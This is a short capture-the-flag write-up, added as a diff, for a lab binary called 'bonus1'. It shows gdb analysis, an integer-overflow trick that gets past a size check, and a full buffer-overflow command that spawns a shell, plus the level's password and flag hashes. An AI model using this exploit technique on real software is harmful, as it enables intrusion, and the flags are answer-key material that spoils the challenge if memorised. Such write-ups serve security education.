@@ -1,0 +1,18 @@
+bonus1 : cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+Process:
+  - In the main function, we can see the call to the atoi and memcpy functions.
+  - The binary takes two parameters.
+  - Memcpy is only called if nb < 10.
+  - The shell is launched only if nb == 0x574f4c46 ("WOLF").
+  - We must therefore specify a negative number and perform a buffer overflow to overwrite the return value of nb and set WOLF to little indian.
+  - gdb ./bonus1
+  - disas main
+  - We see the call to the atoi function, and the return value of this function is stored in eax (+25 ... [esp+0x3c] ... ); 0x3c = 60.
+  - Then we see (+64) lea eax,[esp-0x14] which is the buffer allocation. 0x14 = 20.
+  - 60 - 20 = 40
+  - we have an offset of 40.
+  - we must find nb < 10 and when we multiply nb by 4 truncate to 32 bits, the result must give 44.
+  - (nb * 4) & 0xFFFFFFFF == 44
+  - nb = -1073741813
+  - ./bonus1 -1073741813 $(python -c 'print("A" * 40 + "\x46\x4c\x4f\x57")')
+  - get the flag : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
